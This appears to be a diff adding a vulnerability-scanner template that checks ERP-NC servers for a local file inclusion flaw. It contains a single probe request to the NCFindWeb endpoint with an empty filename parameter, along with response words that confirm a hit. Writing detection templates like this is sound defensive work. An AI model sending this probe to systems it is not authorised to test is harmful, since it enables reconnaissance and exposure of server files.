@@ -1,0 +1,26 @@
+id: erp-nc-directory-traversal
+brief:
+    title: ERP-NC - Local File Inclusion
+    by: pikpikcu
+    level: high
+    about: ERP-NC is vulnerable to local file inclusion.
+    label:
+        - lfi
+        - erp-nc
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename='
+      signs:
+        - "on": word
+          has:
+            - Client
+            - ncwslogin.jsp
+            - admin.jsp
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
